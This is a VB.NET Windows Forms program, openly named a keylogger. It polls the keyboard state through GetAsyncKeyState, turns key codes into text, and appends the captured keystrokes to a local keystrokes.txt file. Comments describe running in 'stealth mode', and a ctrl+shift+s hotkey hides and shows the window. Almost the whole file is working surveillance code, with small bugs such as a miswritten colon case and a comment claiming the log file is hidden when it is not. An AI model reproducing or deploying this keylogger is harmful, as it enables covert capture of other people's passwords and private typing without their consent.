' libraries
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.IO
Imports Shell32

Public Class logger_frm
    ' declarations
    'LIST OF ALL CHARECTER THAT USER ENTERS
    Dim buffer As New List(Of String)
    Dim buffercat As String
    Dim stagingpoint As String
    Dim actual As String
    Dim initlog As Boolean = False
    Dim log As StreamWriter


    Public thread_scan As Thread
    Public thread_hide As Thread


    Delegate Sub Change()
    Dim objchange As New Change(AddressOf DoHide)


    Private Sub frmKeyRogger_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.Text = "Keystroke"


        'HIDE THE PROCESSES AND ALSO MAKE THE APP TO RUN IN STEALTH MODE

        Dim sh As New Shell
        status.Text = "Open"
        thread_hide = New Thread(AddressOf HideIt)
        thread_hide.IsBackground = True
        thread_hide.Start()







        Try
            'RUN THE MAIN THREAD ALSO INITIALIZE THE KEYSTROKES STREAM WRITTER TO WRITE TO TEXT FILE 


            log = New StreamWriter(Environment.CurrentDirectory + "\\keystrokes.txt", True)

            'INITIALIZE THE SCAN THREAD , PRESS F12 TO GO TO DEFINATION 
            thread_scan = New Thread(AddressOf Scan)
            thread_scan.IsBackground = True

            'SCAN THREAN START 
            thread_scan.Start()
        Catch
            MsgBox("Could not open file for writing.  Perhaps it is read only, non-existant, or you lack necessary privileges to access it?")
        End Try


        status.Text = "Logging keystrokes..."


    End Sub

    Private Sub SetText(ByVal [text] As String)
        If txtOutput.InvokeRequired Then
            Dim d As New SetTextCallback(AddressOf SetText)
            Me.Invoke(d, New Object() {[text]})
        Else
            txtOutput.Text = [text]
        End If
    End Sub

    Private Sub frmKeyRogger_Closed(ByVal sender As Object, ByVal e As System.EventArgs) Handles MyBase.Closed
        Call WriteOut()
    End Sub



    <DllImport("USER32.DLL", EntryPoint:="GetAsyncKeyState", SetLastError:=True,
    CharSet:=CharSet.Unicode, ExactSpelling:=True,
    CallingConvention:=CallingConvention.StdCall)>
    Public Shared Function getkey(ByVal Vkey As Integer) As Boolean
    End Function


    Private Sub cmdBegin_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)


    End Sub


    Public Sub Scan()
        Dim foo As Integer
        While 1

            For foo = 1 To 93 Step 1
                If getkey(foo) Then
                    'ADD TO BUFFER FUNCTION CALLED THAT CONTAINS KEYSTROKES AFTER EVRY 1 MS
                    AddtoBuffer(foo, getkey(16))
                End If
            Next

            For foo = 186 To 192 Step 1
                If getkey(foo) Then
                    AddtoBuffer(foo, getkey(16))
                End If
            Next

            BufferToOutput()
            buffer.Clear()
            'THREAD SLEEPS FOR 1 MILI SEC HERE 
            Thread.Sleep(120)



            SetText(stagingpoint)      'THIS FUCNTION IS RESPONSIBLE FOR SETTING THE TEXT ENTERED FROM KEY STROKES OF KEYBOARD TO TEXTBOX 
        End While
    End Sub

    'THJIS FUCNTION CONTAINS THE DEFINATION OF ALL KEYS AND THERE CODE 

    Public Sub AddtoBuffer(ByVal foo As Integer, ByVal modifier As Boolean)
        If Not (foo = 1 Or foo = 2 Or foo = 8 Or foo = 9 Or foo = 13 Or (foo >= 17 And foo <= 20) Or foo = 27 Or (foo >= 32 And foo <= 40) Or (foo >= 44 And foo <= 57) Or (foo >= 65 And foo <= 93) Or (foo >= 186 And foo <= 192)) Then
            Exit Sub
        End If

        Select Case foo
            Case 48 To 57
                If modifier Then
                    Select Case foo
                        Case 48
                            actual = ")"
                        Case 49
                            actual = "!"
                        Case 50
                            actual = "@"
                        Case 51
                            actual = "#"
                        Case 52
                            actual = "$"
                        Case 53
                            actual = "%"
                        Case 54
                            actual = "^"
                        Case 55
                            actual = "&"
                        Case 56
                            actual = "*"
                        Case 57
                            actual = "("
                    End Select
                Else
                    actual = Convert.ToChar(foo)
                End If
            Case 65 To 90
                If modifier Then
                    actual = Convert.ToChar(foo)
                Else
                    actual = Convert.ToChar(foo + 32)
                End If
            Case 1
                'actual = "<LCLICK>"
                actual = ""
            Case 2
                actual = "<RCLICK>"
            Case 8
                actual = "<BACKSPACE>"
            Case 9
                actual = "<TAB>"
            Case 13
                actual = "<ENTER>"
            Case 17
                actual = "<CTRL>"
            Case 18
                actual = "<ALT>"
            Case 19
                actual = "<PAUSE>"
            Case 20
                actual = "<CAPSLOCK>"
            Case 27
                actual = "<ESC>"
            Case 32
                actual = " "
            Case 33
                actual = "<PAGEUP>"
            Case 34
                actual = "<PAGEDOWN>"
            Case 35
                actual = "<END>"
            Case 36
                actual = "<HOME>"
            Case 37
                actual = "<LEFT>"
            Case 38
                actual = "<UP>"
            Case 39
                actual = "<RIGHT>"
            Case 40
                actual = "<DOWN>"
            Case 44
                actual = "<PRNTSCRN>"
            Case 45
                actual = "<INSERT>"
            Case 46
                actual = "<DEL>"
            Case 47
                actual = "<HELP>"
            Case 186
                If modifier Then
                    actual = ":"
                Else
                    actual = ";"
                End If
                actual = ";"

            Case 187
                If modifier Then
                    actual = "+"
                Else
                    actual = "="
                End If
            Case 188
                If modifier Then
                    actual = "<"
                Else
                    actual = ","
                End If
            Case 189
                If modifier Then
                    actual = "_"
                Else
                    actual = "-"
                End If
            Case 190
                If modifier Then
                    actual = ">"
                Else
                    actual = "."
                End If
            Case 191
                If modifier Then
                    actual = "?"
                Else
                    actual = "/"
                End If
            Case 192
                If modifier Then
                    actual = "~"
                Else
                    actual = "`"
                End If
        End Select

        If buffer.Count <> 0 Then
            Dim bar As Integer = 0
            While bar < buffer.Count
                If buffer(bar) = actual Then
                    Exit Sub
                End If
                bar += 1
            End While
        End If

        buffer.Add(actual)


    End Sub


    Public Sub BufferToOutput()
        If buffer.Count <> 0 Then
            Dim qux As Integer = 0
            While qux < buffer.Count
                buffercat = buffercat & buffer(qux)
                qux += 1
            End While

            stagingpoint = stagingpoint & buffercat
            buffercat = String.Empty
        End If
    End Sub

    Delegate Sub SetTextCallback(ByVal [text] As String)





    Private Sub cmdClear_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Switchclear.Click
        txtOutput.Clear()
        stagingpoint = String.Empty
    End Sub





    Private Sub frmKeyRogger_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize
        If Me.WindowState = FormWindowState.Minimized Then
            'Me.Hide()
        End If
    End Sub


    'THIS FUCNTION WRITES THE KEYS TO FILE 
    Public Sub WriteOut()
        MessageBox.Show("writing to bin folder keystroke.txt file"
                          )

        Dim tm As System.DateTime
        tm = Now

        Try
            log.WriteLine(vbNewLine)
        Catch
            log = New StreamWriter(Environment.CurrentDirectory + "\\keystrokes", True)
        End Try
        log.WriteLine(tm)
        If stagingpoint <> Nothing Then
            log.WriteLine(stagingpoint)
        End If
        log.WriteLine(vbNewLine)
        log.Flush()
        log.Close()


        'hides file/sets as hidden
        File.SetAttributes(Environment.CurrentDirectory + "\\keystrokes.txt", FileAttributes.Normal)
    End Sub

    ' ctrl+shift+s toggles hide form
    Public Sub HideIt()
        While 1
            If getkey(17) And getkey(160) And getkey(83) Then
                Me.Invoke(objchange)
            End If
            Thread.Sleep(200)
        End While
    End Sub

    Public Sub DoHide()
        If Me.Visible = True Then
            Me.Visible = False
        Else
            Me.Visible = True
        End If
    End Sub



    Private Sub frmKeylogger_FormClosed(sender As Object, e As FormClosedEventArgs) Handles MyBase.FormClosed
        Application.Exit()

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        WriteOut()
    End Sub

    Private Sub frmKeylogger_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Me.Hide()

        Application.Exit()


    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim B As desktop = New desktop()
        B.Show()
    End Sub
End Class
